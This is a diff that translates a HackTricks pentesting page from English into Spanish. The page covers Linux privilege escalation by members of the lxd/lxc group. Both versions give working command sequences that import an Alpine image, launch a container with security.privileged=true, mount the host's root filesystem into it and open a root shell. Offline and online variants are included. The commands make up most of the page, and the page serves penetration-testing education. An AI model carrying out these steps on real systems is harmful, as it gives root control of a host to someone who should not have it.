@@ -1,25 +1,24 @@
-# lxd/lxc Group - Privilege escalation
+# Grupo lxd/lxc - Escalada de privilegios
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Consigue la [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+Si perteneces al grupo _**lxd**_ **o** _**lxc**_, puedes convertirte en root.
 
-## Exploiting without internet
+## Explotando sin internet
 
-### Method 1
+### Método 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
+Puedes instalar en tu máquina este constructor de distribuciones: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (sigue las instrucciones del github):
 ```bash
 sudo su
 #Install requirements
@@ -37,42 +36,56 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
 ```
+Entonces, sube al servidor vulnerable los archivos **lxd.tar.xz** y **rootfs.squashfs**
 
-Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**
-
-Add the image:
-
+Agrega la imagen:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 lxc image list #You can see your new imported image
 ```
+# Crear un contenedor y agregar la ruta raíz
 
-Create a container and add root path
+Para explotar esta vulnerabilidad, primero debemos crear un contenedor LXD y agregar la ruta raíz del host al contenedor. Para hacer esto, podemos seguir los siguientes pasos:
 
+1. Crear un contenedor LXD:
+
+```
+$ lxc init <image> <container-name> -c security.privileged=true
+```
+
+2. Iniciar el contenedor:
+
+```
+$ lxc start <container-name>
+```
+
+3. Montar la ruta raíz del host en el contenedor:
+
+```
+$ lxc config device add <container-name> host-root disk source=/ path=/mnt/root recursive=true
+```
+
+Con estos pasos, hemos creado un contenedor LXD y hemos agregado la ruta raíz del host al contenedor. Ahora podemos acceder a los archivos del host desde el contenedor y, si encontramos alguna vulnerabilidad de escalada de privilegios, podemos explotarla para obtener acceso root en el host.
 ```bash
 lxc init alpine privesc -c security.privileged=true
 lxc list #List containers
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 {% hint style="danger" %}
-If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-Run **`lxd init`** and **repeat** the previous chunk of commands
+Si encuentra este error _**Error: No se encontró ningún grupo de almacenamiento. Por favor, cree un nuevo grupo de almacenamiento**_\
+Ejecute **`lxd init`** y **repita** el fragmento de comandos anterior
 {% endhint %}
 
-Execute the container:
-
+Ejecute el contenedor:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
+### Método 2
 
-### Method 2
-
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+Construir una imagen de Alpine y ejecutarla usando la bandera `security.privileged=true`, forzando al contenedor a interactuar como root con el sistema de archivos del host.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -96,13 +109,11 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
+Alternativamente [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
 
-Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
+## Con internet
 
-## With internet
-
-You can follow [these instructions](https://reboare.github.io/lxd/lxd-escape.html).
-
+Puedes seguir [estas instrucciones](https://reboare.github.io/lxd/lxd-escape.html).
 ```bash
 lxc init ubuntu:16.04 test -c security.privileged=true
 lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
@@ -110,8 +121,7 @@ lxc start test
 lxc exec test bash
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-
-## Other Refs
+## Otras referencias
 
 {% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}
 
@@ -119,10 +129,10 @@ lxc exec test bash
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
